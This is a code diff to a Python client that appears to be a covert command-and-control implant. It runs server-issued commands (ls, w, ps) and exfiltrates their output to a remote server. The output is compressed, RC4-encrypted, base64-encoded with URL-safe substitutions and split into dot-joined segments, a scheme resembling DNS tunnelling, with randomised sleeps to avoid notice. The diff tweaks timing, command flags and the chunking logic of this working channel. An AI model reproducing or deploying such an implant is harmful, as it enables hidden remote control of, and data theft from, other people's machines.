@@ -21,9 +21,9 @@ class Client:
         self.server_ip = args.destination
         self.source_port = args.source_port
 
-        # TODO: Change back... to [20, 100]
+        # TODO: Change back... to [20, 100], [5,10]
         self.idle_timing = [5, 10]
-        self.sending_timing = [2, 5]
+        self.sending_timing = [1, 2]
         self.sending_data = False
         self.segments_to_send = []
         self.curr_seg_to_send = 0
@@ -60,7 +60,7 @@ class Client:
         else:
             minim, maxim = self.idle_timing
 
-        ran = random.gauss((maxim + minim) / 2, math.sqrt(maxim - minim))
+        ran = random.gauss((maxim + minim) / 2, math.log2(maxim - minim))
         t = max(minim, min(maxim, ran))
         self.__log("Sleeping for: {}s".format(t))
         time.sleep(t)
@@ -103,9 +103,9 @@ class Client:
         elif command == serv_to_client["LS"]:
             output = subprocess.check_output("ls", arg)
         elif command == serv_to_client["W"]:
-            output = subprocess.check_output(['w'])
+            output = subprocess.check_output(['w', '-o'])
         elif command == serv_to_client["PS"]:
-            output = subprocess.check_output(['ps', 'aux'])
+            output = subprocess.check_output(['ps', 'au'])
 
         else:
             self.__log("Unknown command: {}".format(command))
@@ -125,18 +125,22 @@ class Client:
         segment_count = math.ceil(part_count / 3)
 
         self.__log(
-            "Total response length is: {}, while we can fit at most {} per part, which means {} per segment. Total segments: {}".format(
-                len(data), max_size_of_part, 3 * max_size_of_part, segment_count))
+            "Total response length is: {}, while we can fit at most {} per part, "
+            "which means {} per segment. Total segments: {}".format(len(data),
+                                                                    max_size_of_part, 3 * max_size_of_part,
+                                                                    segment_count))
 
         parts = [data[i:i + max_size_of_part] for i in range(0, len(data), max_size_of_part)]
         segments = ["{}.{}.{}.{}".format(parts[3 * i].decode("utf-8"), parts[3 * i + 1].decode("utf-8"),
                                          parts[3 * i + 2].decode("utf-8"), client_to_serv["RESP"]) for i
                     in range(0, len(parts) // 3)]
-        last_seg = ""
-        for i in range(0, len(parts) % 3):
-            last_seg += "{}.".format(parts[i + (len(segments) * 3)].decode("utf-8"))
-        last_seg += client_to_serv["RESP"]
-        segments.append(last_seg)
+
+        if len(parts) % 3 != 0:
+            last_seg = ""
+            for i in range(0, len(parts) % 3):
+                last_seg += "{}.".format(parts[i + (len(segments) * 3)].decode("utf-8"))
+            last_seg += client_to_serv["RESP"]
+            segments.append(last_seg)
 
         return segments
 
@@ -145,7 +149,8 @@ class Client:
         data = zlib.compress(bytes(data))
         cipher = ARC4(self.password).encrypt(data)
         encoded = base64.b64encode(cipher)
-        return encoded.replace(b"=", b"").replace(b"/", b"_").replace(b"+", b"-")
+        encoded = encoded.replace(b"=", b"").replace(b"/", b"_").replace(b"+", b"-")
+        return encoded
 
     def eos(self):
         self.__log("Sending EOS signal...")
